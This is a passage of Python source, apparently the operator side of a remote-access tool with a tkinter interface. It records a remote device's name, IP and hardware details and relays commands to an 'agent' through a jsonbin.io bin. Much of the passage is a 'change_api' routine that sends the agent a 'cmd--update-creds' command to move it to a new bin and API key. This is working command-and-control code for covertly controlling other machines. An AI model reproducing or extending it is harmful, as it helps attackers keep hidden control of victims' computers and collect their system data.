                f.write(f"SYSTEM INFORMATION\nTimestamp: {timestamp}\n")
                f.write(f"Device: {full_info['device']}\n")
                f.write(f"IP: {full_info['ip']}\n")
                f.write(f"CPU: {full_info['cpu']}\n")
                f.write(f"GPU: {full_info['gpu']}\n")
                f.write(f"RAM: {full_info['ram']}\n")
                f.write(f"\n{'─' * 60}\n")
                f.write(f"RAW SYSTEMINFO OUTPUT\n")
                f.write(f"{'─' * 60}\n\n")
                f.write(output)
            self._log_m("SYS: Full audit stored")
        except Exception as e:
            self._log_m(f"Logging Error: {e}")

    def ui_prep(self):
        try:
            if not os.path.exists(STATUS_FILE):
                return None
            with open(STATUS_FILE, 'r', encoding='utf-8') as f:
                content = f.read()
            return {
                "device_name": self.ln_val(content, "Device:"),
                "ip":          self.ln_val(content, "IP:"),
                "ram":         self.ln_val(content, "RAM:"),
                "processor":   self.trunc_w(
                    self.ln_val(content, "CPU:"), 7),
                "gpu":         self.trunc_w(
                    self.ln_val(content, "GPU:"), 7),
            }
        except Exception:
            return None

    def ln_val(self, text, key):
        m = re.search(rf"{key}\s+(.*)", text)
        return m.group(1).strip() if m else "Unknown"

    def trunc_w(self, text, limit):
        if not text or text == "Unknown":
            return "Unknown"
        words = text.split()
        if len(words) <= limit:
            return text
        return " ".join(words[:limit]) + "..."

    def upst(self, info):
        if info:
            device_name = info.get('device_name', 'Unknown')
            device_ip   = info.get('ip',          'N/A')
            self.upstats(f"Connected to {device_name} ({device_ip})", "green")
            self.refresh_treeview()

    def _gr(self, response_json):
        record = response_json.get("record", {})
        if isinstance(record, dict) and "record" in record:
            record = record["record"]
        return record

    def command_(self, cmd):
        cmd = cmd.strip()

        if self.api_change_state is not None:
            if self.api_change_state == "confirm":
                if cmd.lower() != "yes":
                    self._log_m("Ritual cancelled.")
                    self.api_change_state = None
                    return
                backup_file = os.path.join(JSON_FOLDER, "config_backup.json")
                try:
                    with open(backup_file, "w") as backup:
                        json.dump(self.config, backup, indent=4)
                    self._log_m("Backup created: config_backup.json")
                except Exception as e:
                    self._log_m(f"Backup failed: {e}")
                self.api_change_state = "new_bin"
                self._log_m(
                    f"Enter New Bin ID "
                    f"(current: {self.config.get('BIN_ID')}):")
                return

            elif self.api_change_state == "new_bin":
                self.api_change_temp["bin"] = cmd
                self.api_change_state = "new_key"
                self._log_m("New API Key (press Enter to keep same):")
                return

            elif self.api_change_state == "new_key":
                self.api_change_temp["key"] = cmd
                self.api_change_state = "new_url"
                self._log_m("New URL (press Enter to auto-generate):")
                return

            elif self.api_change_state == "new_url":
                self.api_change_temp["url"] = cmd

                if self.api_change_temp.get("bin"):
                    self.config["BIN_ID"] = self.api_change_temp["bin"]
                    self.bin_id_entry.delete(0, tk.END)
                    self.bin_id_entry.insert(0, self.config["BIN_ID"])
                    if not self.api_change_temp.get("url"):
                        self.config["URL"] = (
                            "https://api.jsonbin.io/v3/b/"
                            + self.api_change_temp["bin"])

                if self.api_change_temp.get("key"):
                    self.config["API_KEY"] = self.api_change_temp["key"]
                    self.api_key_entry.delete(0, tk.END)
                    self.api_key_entry.insert(0, self.config["API_KEY"])

                if self.api_change_temp.get("url"):
                    self.config["URL"] = self.api_change_temp["url"]
                    self.url_entry.delete(0, tk.END)
                    self.url_entry.insert(0, self.config["URL"])

                self.sc()
                self._log_m("Registry updated. Sending migration signal...")

                try:
                    with open(
                        os.path.join(JSON_FOLDER, "config_backup.json"),
                        "r"
                    ) as f:
                        old_cfg = json.load(f)

                    headers = {
                        "Content-Type": "application/json",
                        "X-Master-Key": old_cfg["API_KEY"],
                    }
                    migration_creds = {
                        "new_bin": self.config["BIN_ID"],
                        "new_api": self.config["API_KEY"],
                        "new_url": self.config["URL"],
                    }
                    migration_cmd = (
                        f"cmd--update-creds "
                        f"{json.dumps(migration_creds)}")
                    resp = requests.put(
                        old_cfg["URL"],
                        headers=headers,
                        json={"cmd": migration_cmd,
                              "cmd_result": "Migration initiated"},
                        timeout=5)
                    if resp.status_code in (200, 201):
                        self._log_m("SYS: Migration command sent")
                    else:
                        self._log_m(
                            f"Migration failed: {resp.status_code}")
                except Exception as e:
                    self._log_m(f"Migration error: {e}")

                self.api_change_state = None
                self.api_change_temp.clear()
                return

        if cmd == "change_api":
            self.api_change_state = "confirm"
            self.api_change_temp.clear()
            self._log_m(
                "SYS: WARNING: This will modify agent's internal registry.")
            self._log_m("Type 'yes' to proceed:")